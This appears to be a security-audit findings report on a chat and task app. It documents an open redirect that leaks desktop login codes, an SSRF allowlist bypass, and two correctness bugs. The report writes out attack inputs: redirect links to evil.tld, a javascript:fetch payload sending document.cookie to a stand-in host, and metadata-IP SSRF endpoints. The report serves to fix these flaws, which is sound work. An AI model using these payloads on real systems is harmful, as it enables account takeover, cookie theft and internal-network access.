## CRITICAL

### Desktop login bridge redirects the one-time auth code to an attacker-controlled scheme/origin

`server/src/desktop_auth.html:140` — **critical** · auth-bypass · votes 3/3

`/desktop-auth` takes the `scheme` query parameter verbatim and uses it to build the post-login navigation target, so a crafted link sends the freshly minted single-use desktop code (exchangeable for a 30-day JWT) to any origin the attacker names — or executes a `javascript:` URL on the API origin.

**Breaks when:** Attacker sends a victim `https://sharp.example.com/desktop-auth?state=abc&scheme=https%3A%2F%2Fevil.tld%2Fx%3F`. The page is the real, server-rendered login page on the real domain, so the victim signs in (password, passkey, either path ends in `finishWithToken`). `finishWithToken` calls `POST /auth/desktop/code` with the victim's JWT, then `finish(code)` builds `url = 'https://evil.tld/x?' + '://auth?code=' + code + '&state=abc'` and executes `location.href = url` (line 144), navigating the browser to the attacker with the code in the query string (the visible "Open sharp" button at line 111 carries the same URL as a fallback). The attacker POSTs that code to the unauthenticated `POST /auth/desktop/exchange` within its 60s TTL (server/src/auth.rs:610) and receives a full 30-day session JWT for the victim — complete account takeover. With `scheme=javascript:fetch('//evil/'+document.cookie)//` the same assignment executes script on the API origin instead; no CSP is set on this route (main.rs:82, the only response headers added are Cache-Control in `spa_cache_control`).

**Evidence:** desktop_auth.html:119 `var scheme = params.get('scheme') || 'sharp';` → :140 `var url = scheme + '://auth?code=' + encodeURIComponent(code) + '&state=' + encodeURIComponent(state);` → :144 `location.href = url;`. No validation of `scheme` anywhere in the page. The server-side twin of this exact hand-off validates it: `server/src/routes/social_auth.rs:154 fn valid_scheme()` — "Deep-link schemes the desktop bridge may return through. Anything outside this shape is refused so the `scheme` parameter can't be turned into an open redirect to a web origin" — rejecting `http|https|javascript|data|file|vbscript|about|blob` and non `[a-z][a-z0-9+.-]*` shapes before emitting `redirect_302(&format!("{scheme}://auth?{query}"))` at :406. The HTML bridge, which mints the same code for the same deep link, applies none of it. The native side is not the mitigation: `web/src/lib/desktopAuth.ts:56` only checks the URL it receives, and the code has already left the browser.

### Desktop-auth page redirects to an unvalidated `scheme` query parameter, exfiltrating the one-time desktop login code

`server/src/desktop_auth.html:140` — **high** · open-redirect · votes 3/3

`/desktop-auth` (public, served by the API at main.rs:687) reads `scheme` straight from the query string (line 119) and concatenates it into the navigation target after a successful login (lines 140-144), with no allowlist. The same parameter *is* validated server-side for the OAuth path (`valid_scheme`, social_auth.rs:154-166), so the client half of the identical bridge is the unguarded one. **Breaks when:** Attacker sends the victim `https://chat.example.com/desktop-auth?state=x&scheme=https://evil.tld/z%3F` — a page on the real domain, indistinguishable from the legitimate desktop-login page. A `scheme=javascript` variant with `state=%0Aalert(1)` yields script execution on the API origin instead, since a `javascript:` URL is percent-decoded before evaluation.

**Evidence:** desktop_auth.html:119 `var scheme = params.get('scheme') || 'sharp';` (no validation); 140 `var url = scheme + '://auth?code=' + encodeURIComponent(code) + '&state=' + encodeURIComponent(state);`; 141 `openLink.href = url;`; 144 `location.href = url;`. ### fracIndex sort_order is generated/compared under the DB's en_US collation, so new keys collide and ordering diverges from the client

`server/src/routes/tasks.rs:643` — **high** · correctness · votes 3/3

`last_sort_order` takes `max(sort_order)` and `list_tasks` does `ORDER BY t.sort_order` on a plain `text` column, but the base-62 fracIndex alphabet (`0-9A-Za-z`) only sorts correctly under byte/code-unit order. The deployed database collation is `en_US.utf8`, where `'k' < 'V'`, so `max()` returns a non-maximal key and `append_index` re-emits a key that already exists in the column.

**Breaks when:** Project HOME, column Backlog. Task 1 → sort_order 'V' (append_index(None)). Task 2 → max='V' → 'k'. Task 3 → Postgres `max('V','k')` returns 'V' under en_US.utf8 (verified: `select max(x) from (values ('V'),('k')) t(x)` → 'V'), so append_index('V') → 'k' again — a duplicate of task 2's key, and every subsequent task in that column also gets 'k'. Creation order is then decided by the `t.id` tie-break, and a board drag onto a position inside the duplicate run resolves to `between('k','k')` = 'kV', which lands after the whole run, so the drop position silently reverts on the next refetch. The same `max()` is used by `apply_state_change` (tasks.rs:940), so every cross-column drag/automation move appends a colliding key too.

**Evidence:** tasks.rs:60 `FRAC_DIGITS = b"0123456789ABC…xyz"` and tasks.rs:641-648 `SELECT max(sort_order) FROM tasks WHERE state_id = $1`; tasks.rs:808 `ORDER BY t.sort_order, t.id`. Migration 0023_tasks.sql declares `sort_order text NOT NULL` with no `COLLATE "C"`. Live DB: `select datcollate from pg_database where datname='sharp'` → `en_US.utf8`; `select x from (values ('V'),('k'),('a'),('Z')) t(x) order by x` → a, k, V, Z. Client side is byte order: web/src/lib/fracIndex.ts header ("ordered by char code") and web/src/lib/store/taskHelpers.ts:13 `a.sort_order < b.sort_order`. The divergence is already observable in the dev DB: `ORDER BY sort_order` returns HOME-3 ('k') before HOME-2 ('V'), while `sortTasks` puts HOME-2 first, and `loadProjectTasks` (web/src/store.ts:2806) stores the server order unsorted, so the list re-orders itself as soon as any `task.*` event arrives.

### PATCH /tasks/{id} cannot clear assignee, due date or parent — `Option<Option<T>>` without a double-option deserializer treats JSON null as absent

`server/src/routes/tasks.rs:919` — **high** · correctness · votes 3/3

`UpdateTaskRequest.assignee_id`, `.due_date`, `.parent_id` (and `UpdateProjectRequest.channel_id`, tasks.rs:460) are `Option<Option<T>>` with only `#[serde(default)]`. serde deserializes JSON `null` to the outer `None`, so `Some(None)` is unreachable and every clear request is read as "field omitted".

### `endpoint_allowed` SSRF guard is trivially bypassable (hostname indirection, IPv4-mapped IPv6, 0.0.0.0, decimal IP)

`server/src/routes/push.rs:51` — **medium** · ssrf · votes 3/3

The push-endpoint allowlist only string-matches the literal host, so any attacker-controlled DNS name (or a non-dotted-quad literal) that resolves to an internal address passes, and the server then POSTs to it on every notification — defeating the control the module header calls "a security control, not a convenience".

**Breaks when:** An authenticated user calls `POST /push/subscribe` with `endpoint: "https://metadata.attacker.com/x"` where that name resolves to 169.254.169.254 (or with `https://[::ffff:169.254.169.254]/x`, `https://0.0.0.0/x`, or `https://2130706433/x`). `endpoint_allowed` sees host "metadata.attacker.com" / "::ffff:169.254.169.254" / "0.0.0.0" / "2130706433": none is empty, `localhost`, `.local`, `.internal`, and none matches the `127.`/`10.`/`192.168.`/`169.254.`/`172.16-31.` prefix tests, and the IPv6 branch only rejects `::1`/`fc*`/`fd*`/`fe80*`. The row is stored, and thereafter every notification for that user makes `push::send_payload` POST an encrypted body to the cloud metadata endpoint or another loopback/internal service — a repeatable, authenticated blind SSRF primitive that the caller can trigger on demand by messaging themselves.

**Evidence:** routes/push.rs:51-92 `fn endpoint_allowed(endpoint: &str) -> bool { ... if h.contains(':') && (h == "::1" || h.starts_with("fc") || h.starts_with("fd") || h.starts_with("fe80")) { return false; } if h.starts_with("127.") || h.starts_with("10.") || h.starts_with("192.168.") || h.starts_with("169.254.") { return false; } ... true }` — all checks are on the literal string, never on the resolved address. The module header (routes/push.rs:17-19) states: "`endpoint_allowed` is a security control, not a convenience: the endpoint URL arrives from the client and the server then makes requests to it, so it must stay restricted to known push services or it becomes an SSRF primitive."
